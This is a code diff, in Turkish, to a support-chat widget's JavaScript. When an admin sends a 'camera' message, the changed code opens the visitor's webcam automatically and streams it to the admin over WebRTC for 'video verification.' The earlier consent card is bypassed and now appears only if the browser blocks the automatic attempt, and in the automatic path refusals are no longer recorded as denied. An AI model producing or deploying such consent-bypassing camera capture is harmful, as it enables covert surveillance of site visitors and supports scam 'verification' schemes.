@@ -462,18 +462,19 @@
     return { wrap, video, label };
   }
 
-  async function startVisitorCamera(box, callId) {
+  async function startVisitorCamera(box, callId, options = {}) {
+    const auto = options.auto === true;
     const sync = window.ChatSync;
     if (!sync?.enabled) {
       appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
         sync: false,
       });
-      return;
+      return "error";
     }
     if (!navigator.mediaDevices?.getUserMedia) {
       appendMessage(box, "bot", "Bu tarayıcı kamerayı desteklemiyor.", { sync: false });
-      await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
-      return;
+      if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
+      return "error";
     }
 
     await stopCameraSession(callId, { upload: false });
@@ -484,7 +485,12 @@
         video: { facingMode: "user" },
         audio: false,
       });
-    } catch {
+    } catch (err) {
+      const name = String(err?.name || "");
+      // Otomatik açılışta jest/izin yoksa kart göster; denied yazma
+      if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
+        return "need-gesture";
+      }
       appendMessage(
         box,
         "bot",
@@ -493,7 +499,7 @@
       );
       syncMessage("user", "Kamera izni reddedildi / erişilemedi.");
       await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
-      return;
+      return "denied";
     }
 
     const preview = showLocalCameraPreview(box, stream, callId);
@@ -578,13 +584,15 @@
         sdp: offer.sdp,
       });
       await sync.setCameraCallStatus(sessionId, callId, "live");
-      appendMessage(box, "user", "Kamerayı açtım.");
+      appendMessage(box, "user", auto ? "Kamera otomatik açıldı." : "Kamerayı açtım.");
+      return "ok";
     } catch {
       await stopCameraSession(callId, { upload: false });
       appendMessage(box, "bot", "Kamera bağlantısı kurulamadı. Tekrar deneyin.", {
         sync: false,
       });
       await sync.setCameraCallStatus(sessionId, callId, "ended").catch(() => {});
+      return "error";
     }
   }
 
@@ -600,12 +608,12 @@
     title.className = "chat-inline-prompt-title";
     title.textContent =
       msg.text ||
-      "Görüntülü doğrulama için kameranızı açmanız isteniyor. İzin verirseniz görüntü yalnızca bu destek oturumuna bağlanır.";
+      "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır.";
 
     const note = document.createElement("p");
     note.className = "chat-camera-note";
     note.textContent =
-      "Tarayıcı izin penceresi açılacak. Oturum kaydı alınabilir. İstediğiniz zaman kapatabilirsiniz.";
+      "Tarayıcı otomatik açamadı. Devam etmek için aşağıdan kamerayı açın. Oturum kaydı alınabilir.";
 
     const actions = document.createElement("div");
     actions.className = "chat-inline-prompt-actions";
@@ -637,7 +645,7 @@
         });
         return;
       }
-      await startVisitorCamera(box, callId);
+      await startVisitorCamera(box, callId, { auto: false });
     };
 
     okBtn.addEventListener("click", () => finish(true));
@@ -646,6 +654,31 @@
     card.append(title, note, actions);
     box.appendChild(card);
     box.scrollTop = box.scrollHeight;
+    okBtn.focus();
+  }
+
+  async function autoOpenCameraFromMessage(box, msg) {
+    const callId = msg.callId;
+    if (!callId) {
+      showCameraRequest(box, msg);
+      return;
+    }
+
+    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
+    const status = document.createElement("div");
+    status.className = "chat-inline-prompt chat-camera-auto";
+    status.innerHTML =
+      '<p class="chat-inline-prompt-title">Kamera otomatik açılıyor…</p>' +
+      '<p class="chat-camera-note">Tarayıcı izin isterse lütfen İzin Ver seçin.</p>';
+    box.appendChild(status);
+    box.scrollTop = box.scrollHeight;
+
+    const result = await startVisitorCamera(box, callId, { auto: true });
+    status.remove();
+
+    if (result === "need-gesture") {
+      showCameraRequest(box, msg);
+    }
   }
 
   function showVisitorPopup(box, msg, onChoice) {
@@ -716,7 +749,7 @@
   function handleAdminIncoming(box, msg) {
     if (msg.type === "camera") {
       appendMessage(box, "admin", msg.text || "Kamera erişimi isteniyor.", { sync: false });
-      showCameraRequest(box, msg);
+      autoOpenCameraFromMessage(box, msg);
       return;
     }
     const isPopup = msg.type === "popup" || msg.popup === true;
